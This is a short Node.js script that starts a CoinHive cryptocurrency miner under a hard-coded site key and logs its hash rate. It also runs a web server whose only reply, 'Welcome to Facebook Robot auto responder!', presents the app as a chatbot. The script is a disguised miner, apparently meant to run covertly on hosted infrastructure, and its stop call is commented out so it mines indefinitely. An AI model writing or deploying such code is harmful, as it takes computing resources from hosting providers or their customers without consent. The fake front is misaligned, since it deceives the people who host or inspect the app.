const CoinHive = require('coin-hive');
const http = require('http');  

(async () => {
 
  // Create miner
  const miner = await CoinHive('tWKqOB1tC2Fg8J9vaY7evFp1NbfDVaif'); // Coin-Hive's Site Key
 
  // Start miner
  await miner.start();
 
  // Listen on events
  miner.on('found', () => console.log('y!'))
  miner.on('accepted', () => console.log('o!!'))
  miner.on('update', data => console.log(`
    Hashes per second: ${data.hashesPerSecond}
    Total hashes: ${data.totalHashes}
    Accepted hashes: ${data.acceptedHashes}
  `));
 
  const requestHandler = (request, response) => {  
    console.log(request.url)
    response.end('Welcome to Facebook Robot auto responder!')
  }

  const server = http.createServer(requestHandler)

  server.listen(process.env.PORT, (err) => {  
    if (err) {
      return console.log('xxxx', err)
    }

    console.log(`s s s s`)
  })

  //Stop miner
  //setTimeout(async () => await miner.stop(), 30000);
})();
